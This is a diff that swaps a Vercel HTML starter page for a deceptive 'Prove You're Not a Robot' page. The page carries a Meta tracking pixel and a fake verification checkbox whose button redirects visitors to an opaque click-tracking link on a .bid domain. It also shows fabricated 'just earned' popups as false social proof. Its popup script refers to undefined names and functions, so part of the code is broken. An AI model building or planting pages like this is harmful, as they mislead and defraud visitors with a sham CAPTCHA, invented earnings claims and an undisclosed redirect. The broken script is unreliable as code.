@@ -1,96 +1,197 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+ <head>
+  <link rel="icon" type="image/png" href="https://ng.sam-offer.xyz/assets/favicon/favicon-96x96.png" sizes="96x96">
+  <link rel="icon" type="image/svg+xml" href="https://ng.sam-offer.xyz/assets/favicon/favicon.svg">
+  <link rel="shortcut icon" href="https://ng.sam-offer.xyz/assets/favicon/favicon.ico">
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '738451622060677');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=738451622060677&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+   
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Prove You’re Not a Robot</title>
+  <meta name="description" content="Please verify you're human to continue.">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet">
+  <style>
+:root{
+  --bg:#0b1222;
+  --card:#111827;
+  --text:#f8fafc;
+  --muted:#9ca3af;
+  --accent:#06b6d4;
+  --accent-hover:#0ea5e9;
+  --shadow:0 15px 40px rgba(0,0,0,0.4);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'Inter',sans-serif;
+  background:linear-gradient(180deg,#F5F5F5 0%,#F5F5F5  100%);
+  display:flex;justify-content:center;align-items:center;
+  height:100vh;color:var(--text);
+  padding:20px;
+}
+.card{
+  background:linear-gradient(180deg,rgba(17,24,39,.92),rgba(17,24,39,.86));
+  border:1px solid rgba(148,163,184,.2);
+  border-radius:18px;
+  padding:40px 30px;
+  text-align:center;
+  width:100%;
+  max-width:420px;
+  box-shadow:var(--shadow);
+  backdrop-filter:blur(10px);
+  animation:fadeIn .6s ease;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.card svg{
+  width:52px;height:52px;margin-bottom:14px;
+  fill:none;stroke:#93c5fd;stroke-width:2;
+}
+h1{font-size:22px;font-weight:700;margin-bottom:8px}
+p{color:var(--muted);font-size:15px;margin-bottom:24px;line-height:1.5}
+
+.check{
+  display:flex;align-items:center;justify-content:center;
+  gap:10px;font-size:15px;color:var(--muted);margin-bottom:28px;
+}
+.check input{
+  width:22px;height:22px;cursor:pointer;
+  accent-color:var(--accent);
+  transition:transform .15s;
+}
+.check input:checked{transform:scale(1.1)}
+
+button{
+  width:100%;padding:15px 0;font-size:16px;font-weight:700;
+  border:none;border-radius:10px;
+  background:#1e293b;color:#94a3b8;cursor:not-allowed;
+  transition:all .25s ease;
+}
+button.active{
+  background:linear-gradient(180deg,var(--accent),var(--accent-hover));
+  color:#fff;cursor:pointer;
+  box-shadow:0 8px 20px rgba(6,182,212,.35);
+}
+button.active:hover{filter:brightness(1.06)}
+
+footer{margin-top:18px;font-size:12px;color:var(--muted)}
+footer a{color:var(--muted);text-decoration:none}
+footer a:hover{text-decoration:underline}
+
+/* Popup earnings */
+.popup-bar{
+  position:fixed;top:14px;left:50%;transform:translateX(-50%);
+  background:rgba(0,0,0,.85);color:#fff;
+  padding:10px 22px;border-radius:14px;
+  font-size:14px;font-weight:600;
+  box-shadow:0 8px 25px rgba(0,0,0,.4);
+  display:none;z-index:9999;
+  animation:fadeSlide .4s ease;
+}
+@keyframes fadeSlide{from{opacity:0;transform:translate(-50%,-10px)}to{opacity:1;transform:translate(-50%,0)}}
+</style>
+  <link rel="me" href="https://www.blogger.com/profile/18077544741616505406">
+  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+  <meta name="google-adsense-platform-domain" content="blogspot.com">
+  <link rel="me" href="https://www.blogger.com/profile/08837254202552020328">
+  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+  <meta name="google-adsense-platform-domain" content="blogspot.com">
+  <link rel="me" href="https://www.blogger.com/profile/08837254202552020328">
+  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+  <meta name="google-adsense-platform-domain" content="blogspot.com">
+ </head>
+ <body>
+  <div class="popup-bar" id="popupBar"></div>
+  <div class="card">
+   <svg viewBox="0 0 24 24">
+    <path d="M6 10v10h12V10m-6 4v4m-7 0h14V10a2 2 0 0 0-2-2h-2V6a2 2 0 0 0-4 0v2H8a2 2 0 0 0-2 2Z" />
+   </svg>
+   <h1>Prove You’re Not a Robot</h1>
+   <p>Please tick the box below to continue to the next step.</p>
+   <div class="check">
+    <input type="checkbox" id="robotCheck"> <label for="robotCheck">I am not a robot</label>
+   </div>
+   <button id="continueBtn" disabled>Continue</button>
+   <footer>
+    © <span id="year"></span> | Protected by ADEX.COM
+   </footer>
+  </div>
+  <script>
+window.addEventListener('load',()=>{
+  const year=document.getElementById('year');
+  const checkbox=document.getElementById('robotCheck');
+  const btn=document.getElementById('continueBtn');
+  const popup=document.getElementById('popupBar');
+  const targetURL="https://nkpqxvr.bid/cl/267ff6924ccc5036";
+
+  // Year auto update
+  year.textContent=new Date().getFullYear();
+
+  // Checkbox logic
+  checkbox.addEventListener('change',()=>{
+    if(checkbox.checked){
+      btn.classList.add('active');
+      btn.disabled=false;
+    }else{
+      btn.classList.remove('active');
+      btn.disabled=true;
+    }
+  });
+
+  // Redirect
+  btn.addEventListener('click',()=>{
+    if(!btn.disabled) window.location.href=targetURL;
+  });
+
+
+  
+  
+
+  // Generate dataset with template strings
+
+  let data=names.map(n=>`${n} just earned ${randomEarning()}`);
+
+  data.sort(()=>Math.random()-0.5);
+
+  let i=0;
+
+  function cycle(){
+
+    popup.textContent=data[i];
+
+    popup.style.display='block';
+
+    setTimeout(()=>{
+
+      popup.style.display='none';
+
+      i=(i+1)%data.length;
+
+      setTimeout(cycle,2000);
+
+    },4000);
+
+  }
+
+  cycle();
+
+});
+</script>
+ </body>
 </html>
